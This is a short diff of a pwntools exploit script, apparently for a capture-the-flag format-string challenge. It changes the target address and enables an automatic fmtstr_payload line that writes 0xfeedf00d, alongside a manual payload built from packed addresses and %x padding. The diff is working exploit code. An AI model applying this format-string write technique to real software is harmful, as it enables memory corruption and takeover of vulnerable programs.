@@ -19,13 +19,13 @@ c
 io = start()
 
 # === Automatic ===
-# payload = fmtstr_payload(6, {0x804c020: 0xfeedf00d})
+payload = fmtstr_payload(6, {0x804c024: 0xfeedf00d})
 # =================
 
 
 # === Manual ===
-payload = p32(0x804c020)
-payload += p32(0x804c022)
+payload = p32(0x804c024)
+payload += p32(0x804c026)
 # 8 bytes writen ^
 
 payload += b'%61445x' # feed - 8
